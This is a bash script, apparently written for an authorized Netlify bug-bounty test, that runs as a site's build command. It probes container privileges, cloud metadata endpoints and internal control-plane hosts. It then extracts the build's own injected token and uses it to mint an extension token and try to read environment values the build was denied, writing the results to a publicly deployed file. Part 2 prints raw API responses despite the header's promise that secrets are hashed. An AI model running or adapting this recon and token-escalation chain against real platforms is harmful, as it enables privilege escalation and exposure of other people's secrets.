#!/usr/bin/env bash
# ============================================================================
# Netlify build-container recon payload  --  runs AS THE BUILD COMMAND
# Netlify H1 program, authorized. Testing only against a site I own.
#
# RoE anchor: program policy puts "general RCE in your site builds" out of scope
# BUT carves back in: root escalation / secrets not already accessible to your
# user / container escape / access to the orchestration control plane.
# This script measures exactly those four and nothing else.
#
# DISCIPLINE:
#  - read-only. no writes to any Netlify infra, no exploitation, no brute force.
#  - every internal host probed is on an IN-SCOPE wildcard (see targets-inscope.txt).
#  - short timeouts, sequential, single request per target -> no load concern.
#  - fabricated controls included so "unreachable" is distinguishable from "blocked".
#  - the ONLY secrets printed are this site's own; token VALUES are hashed, never echoed.
# ============================================================================
set +e
exec > >(tee "$(dirname "$0")/public/r-eae798aed843bbb0.txt") 2>&1
echo "=================== NETLIFY BUILD RECON =================================="
echo "date_utc=$(date -u +%FT%TZ)  ctx=${CONTEXT:-?}  site=${SITE_NAME:-?}  deploy=${DEPLOY_ID:-?}"

hr () { echo; echo "----- $* -----"; }

# --------------------------------------------------------------- A4: identity / root
hr "A4  identity, privileges, container shape"
id
echo "whoami=$(whoami)  home=$HOME  pwd=$(pwd)"
echo "kernel=$(uname -a)"
echo "CapEff=$(grep -E '^Cap(Eff|Prm|Bnd)' /proc/self/status | tr '\n' ' ')"
echo "NoNewPrivs=$(grep -E '^NoNewPrivs|^Seccomp' /proc/self/status | tr '\n' ' ')"
echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
echo "cgroup:"; head -5 /proc/self/cgroup 2>/dev/null
echo "sudo -n -l:"; timeout 5 sudo -n -l 2>&1 | head -5
echo "writable docker socket: $([ -w /var/run/docker.sock ] && echo YES || echo no)"
echo "setuid binaries outside /usr/bin:"; timeout 25 find / -xdev -perm -4000 -type f 2>/dev/null | grep -v '^/usr/bin' | head -20

hr "A4b  mounts (looking for host paths / shared volumes)"
cat /proc/mounts 2>/dev/null | grep -vE '^(proc|sysfs|tmpfs|devpts|cgroup|mqueue|shm) ' | head -30

# --------------------------------------------------------- A1: the injected token
hr "A1  build-injected credential (values HASHED, never printed)"
# blobs.ts:40-49 -> NETLIFY_BLOBS_CONTEXT = base64({apiURL,deployID,siteID,token})
if [ -n "$NETLIFY_BLOBS_CONTEXT" ]; then
  echo "NETLIFY_BLOBS_CONTEXT present, len=${#NETLIFY_BLOBS_CONTEXT}"
  echo "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null \
    | python3 -c 'import sys,json,hashlib
d=json.load(sys.stdin)
for k,v in d.items():
    if k.lower()=="token":
        print(f"  token: len={len(v)} prefix={v[:4]}... sha256={hashlib.sha256(v.encode()).hexdigest()[:16]}")
    else:
        print(f"  {k}: {v}")' 2>/dev/null
else
  echo "NETLIFY_BLOBS_CONTEXT ABSENT"
fi
for v in NETLIFY_AUTH_TOKEN NETLIFY_API_TOKEN NETLIFY_SKEW_PROTECTION_TOKEN NPM_TOKEN; do
  eval "val=\$$v"
  [ -n "$val" ] && echo "$v present len=${#val} sha256=$(printf %s "$val" | sha256sum | cut -c1-16)"
done

hr "A1b  parent process cmdline/env (does buildbot pass --token on argv?)"
for p in $PPID 1; do
  echo "  pid $p cmdline: $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | sed -E 's/(--token[= ]|Bearer )[A-Za-z0-9._-]+/\1<REDACTED>/g' | head -c 400)"
done
echo "  processes:"; ps -eo pid,ppid,user,args 2>/dev/null | sed -E 's/(--token[= ]|Bearer )[A-Za-z0-9._-]+/\1<REDACTED>/g' | head -25
echo "  env var NAMES visible to build (values withheld):"
env | cut -d= -f1 | sort | tr '\n' ' '; echo

# ------------------------------------------------------------- A3: cloud metadata
hr "A3  cloud metadata reachability"
mdt () { printf "  %-46s -> " "$1"; timeout 4 curl -s -o /dev/null -w '%{http_code}\n' "$2" ${3:+-H "$3"} 2>/dev/null || echo TIMEOUT; }
mdt "AWS IMDSv1 /latest/meta-data/"        "http://169.254.169.254/latest/meta-data/"
printf "  %-46s -> " "AWS IMDSv2 PUT /latest/api/token"
timeout 4 curl -s -o /dev/null -w '%{http_code}\n' -X PUT "http://169.254.169.254/latest/api/token" -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null || echo TIMEOUT
mdt "ECS task role 169.254.170.2"          "http://169.254.170.2/v2/credentials/"
mdt "GCP metadata.google.internal"         "http://metadata.google.internal/computeMetadata/v1/" "Metadata-Flavor: Google"
mdt "Azure IMDS"                           "http://169.254.169.254/metadata/instance?api-version=2021-02-01" "Metadata: true"

# ------------------------------------------- A2: orchestration control plane reach
hr "A2  network position -- DNS + TCP reach to IN-SCOPE control plane"
echo "  resolv.conf:"; grep -E '^(nameserver|search)' /etc/resolv.conf 2>/dev/null | head -6
echo "  routes:";      (ip route 2>/dev/null || route -n 2>/dev/null) | head -6
echo "  addrs:";       (ip -4 -o addr 2>/dev/null || ifconfig 2>/dev/null | grep inet) | head -6

reach () { # host port label
  printf "  %-50s :%-5s " "$1" "$2"
  ipa=$(getent ahostsv4 "$1" 2>/dev/null | awk '{print $1}' | head -1)
  if [ -z "$ipa" ]; then echo "NXDOMAIN"; return; fi
  if timeout 4 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null; then
    echo "$ipa  OPEN"
  else
    echo "$ipa  closed/filtered"
  fi
}
# T1 orchestration control plane (in scope: *.infra-prod.nsvcs.net)
reach consul.infra-prod.nsvcs.net      8500   # consul HTTP API
reach consul.infra-prod.nsvcs.net      8501   # consul HTTPS API
reach consul-api.infra-prod.nsvcs.net  443
reach vault-releng.infra-prod.nsvcs.net 8200
reach vault-releng.infra-prod.nsvcs.net 443
reach awx.infra-prod.nsvcs.net         443
reach shepherd.infra-prod.nsvcs.net    443
reach argocd.infra-prod.nsvcs.net      443
# T2 secret / config services (in scope: *.services-prod.nsvcs.net)
reach envelope.services-prod.nsvcs.net 443
reach envelope.services-prod.nsvcs.net 80
reach jigsaw.services-prod.nsvcs.net   443
# fabricated controls -- MUST stay dead. if these read OPEN the whole table is void.
reach zzz-cherry-control.infra-prod.nsvcs.net    443
reach zzz-cherry-control.services-prod.nsvcs.net 443

hr "A2b  if consul/envelope answered, what do they say? (read-only, no KV writes)"
for u in "http://consul.infra-prod.nsvcs.net:8500/v1/status/leader" \
         "http://consul.infra-prod.nsvcs.net:8500/v1/catalog/services" \
         "https://envelope.services-prod.nsvcs.net/" ; do
  printf "  %-62s -> " "$u"
  timeout 6 curl -sk -o /tmp/cp.out -w '%{http_code} ' "$u" 2>/dev/null || printf 'TIMEOUT '
  head -c 200 /tmp/cp.out 2>/dev/null | tr -d '\n'; echo
done

# --------------------------------------------------------------- A6: shared cache
hr "A6  build cache -- is it per-site?"
ls -la /opt/buildhome/ 2>/dev/null | head -20
echo "  cache dir:"; ls -la /opt/buildhome/cache 2>/dev/null | head -15
echo "  any other uid's files under /opt?"; find /opt -xdev -maxdepth 3 ! -user "$(whoami)" 2>/dev/null | head -15

echo
echo "=================== END RECON ==========================================="

# ============================================================================
# PART 2 -- what does THIS build's own credential buy?
# The question the whole lane rests on: a build is denied sensitive env values,
# but is it handed authority that can fetch them back?
# ============================================================================
hr "B1  extract this build's own token from NETLIFY_BLOBS_CONTEXT"
BT=$(printf %s "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
if [ -z "$BT" ]; then echo "  no token in blobs context"; else
  echo "  token len=${#BT} prefix=${BT:0:4} sha256=$(printf %s "$BT" | sha256sum | cut -c1-16)"
fi

hr "B2  does the build token work against the DOCUMENTED api? (api.netlify.com)"
for p in /api/v1/user /api/v1/sites /api/v1/accounts "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
  printf "  %-52s -> " "$p"
  timeout 12 curl -sS -o /tmp/b.out -w '%{http_code} ' "https://api.netlify.com$p" -H "Authorization: Bearer $BT" 2>/dev/null || printf 'ERR '
  head -c 220 /tmp/b.out 2>/dev/null | tr -d '\n'; echo
done

hr "B3  will JIGSAW mint an extension_token for this build's token?"
JG=https://jigsaw.services-prod.nsvcs.net
printf "  team/%s/.../meta/%s -> " "${ACCOUNT_ID:0:10}…" "${SITE_ID:0:10}…"
timeout 12 curl -sk -o /tmp/j.out -w '%{http_code} ' "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SITE_ID" \
  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null || printf 'ERR '
python3 - </tmp/j.out <<'PY' 2>/dev/null || echo "(no token)"
import sys,json,base64
try: d=json.load(sys.stdin)
except Exception: print("  unparsable"); raise SystemExit
for e in d if isinstance(d,list) else []:
    t=e.get("extension_token") or ""
    if not t: print(f"  {e.get('slug')}: extension_token EMPTY"); continue
    p=t.split(".")[1]; p+="="*(-len(p)%4)
    c=json.loads(base64.urlsafe_b64decode(p))
    print(f"  {e.get('slug')}: owner_id={c.get('owner_id')} actor={c.get('actor_type')}")
    print(f"     scopes={c.get('authorized_scopes')}")
    open("/tmp/ET","w").write(t)
PY

hr "B4  with that extension token, can the build read the env it was denied?"
if [ -s /tmp/ET ]; then
  ET=$(cat /tmp/ET)
  for p in /api/v1/user "/api/v1/accounts/$ACCOUNT_ID/env" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
    printf "  %-52s -> " "$p"
    timeout 12 curl -sk -o /tmp/e.out -w '%{http_code} ' "$JG$p" -H "Authorization: Bearer $ET" 2>/dev/null || printf 'ERR '
    head -c 300 /tmp/e.out 2>/dev/null | tr -d '\n'; echo
  done
else
  echo "  no extension token minted -- skipped"
fi

hr "B5  canary check: which env values were actually PASSED to this build?"
echo "  CHERRY_PLAIN in env: $([ -n "$CHERRY_PLAIN" ] && echo "YES ($CHERRY_PLAIN)" || echo no)"
echo "  CHERRY_SECRET in env: $([ -n "$CHERRY_SECRET" ] && echo YES || echo no)"
